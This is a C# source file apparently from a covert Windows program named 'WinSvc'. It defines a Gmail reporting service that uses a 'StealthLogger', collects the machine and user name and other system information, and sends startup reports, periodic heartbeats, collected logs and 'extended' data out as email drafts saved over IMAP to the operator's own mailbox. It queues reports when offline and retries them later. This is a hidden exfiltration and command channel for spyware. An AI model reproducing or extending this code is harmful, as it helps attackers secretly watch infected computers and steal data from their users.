using System;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;

using WinSvc.Configuration;
using WinSvc.Core;
using WinSvc.Imap;

namespace WinSvc.Services;

public class GmailReportService : IDisposable
{
    private readonly GmailConfig _config;
    private readonly StealthLogger _logger;
    private readonly StateManager _state;
    private readonly SystemInfoCollector _sysInfo;
    private ImapClient _imap;
    private string _label;

    public GmailReportService(GmailConfig config, StealthLogger logger, StateManager state)
    {
        _config = config;
        _logger = logger;
        _state = state;
        _sysInfo = new SystemInfoCollector();
    }

    public bool Initialize()
    {
        _label = _sysInfo.GetLabel(); //whoami:pcname\username
        _logger.Info($"Init: {_label}");

        if (!EnsureConnected())
        {
            _logger.Error("Initial connection failed");
            return false;
        }

        SendReport("INIT", _sysInfo.CollectReport());
        ProcessPending();
        return true;
    }

    public void SendHeartbeat()
    {
        if (!EnsureConnected()) return;

        var logs = _state.GetAndClearLogs();
        var report = new StringBuilder();
        report.AppendLine(_sysInfo.CollectReport());

        if (!string.IsNullOrEmpty(logs))
        {
            report.AppendLine();
            report.AppendLine("=== LOGS ===");
            report.AppendLine(logs);
        }

        SendReport("HEARTBEAT", report.ToString());
        _logger.ClearPending();
    }

    public void SendExtendedReport(string data)
    {
        if (!EnsureConnected())
        {
            _state.SavePendingReport(data);
            return;
        }
        SendReport("EXTENDED", data);
    }

    private bool EnsureConnected()
    {
        if (_imap?.IsConnected ?? false) return true;

        _imap?.Dispose();
        _imap = new ImapClient(_config, _logger);

        for (int i = 1; i <= 5; i++)
        {
            if (!HasInternet())
            {
                Thread.Sleep(5000 * i);
                continue;
            }

            var conn = _imap.Connect();
            if (!conn.Success)
            {
                Thread.Sleep(5000 * i);
                continue;
            }

            var login = _imap.Login();
            if (login.Success) return true;

            if (login.IsAuthFailure)
            {
                _logger.Error("Auth failed - credentials invalid");
                return false;
            }

            Thread.Sleep(5000 * i);
        }

        return false;
    }

    private void SendReport(string type, string body)
    {
        var email = BuildEmail(type, body);
        var resp = _imap.AppendDraft(email);

        if (resp.Success)
        {
            _logger.Info($"{type} sent");
        }
        else
        {
            _logger.Error($"{type} failed: {resp.Message}");
            _state.SavePendingReport(email);
        }
    }

    private void ProcessPending()
    {
        var pending = _state.GetPendingReports();
        _logger.Info($"Processing {pending.Length} pending");

        foreach (var file in pending)
        {
            var content = _state.ReadPendingReport(file);
            if (content == null) continue;

            var resp = _imap.AppendDraft(content);
            if (resp.Success)
            {
                _state.DeletePendingReport(file);
            }
            else
            {
                break; // Stop if connection bad
            }
        }
    }

    private string BuildEmail(string type, string body)
    {
        var sb = new StringBuilder();
        sb.AppendLine($"From: {_config.Username}");
        sb.AppendLine($"To: {_config.Username}");
        sb.AppendLine($"Subject: [{type}] {_label}");
        sb.AppendLine($"Date: {DateTime.UtcNow:R}");
        sb.AppendLine($"X-Gmail-Labels: {_label}");
        sb.AppendLine();
        sb.AppendLine($"=== {type} ===");
        sb.AppendLine(body);
        return sb.ToString();
    }

    private bool HasInternet()
    {
        try
        {
            return new Ping().Send("8.8.8.8", 3000).Status == IPStatus.Success;
        }
        catch
        {
            return false;
        }
    }

    public void Dispose()
    {
        _imap?.Dispose();
    }
}
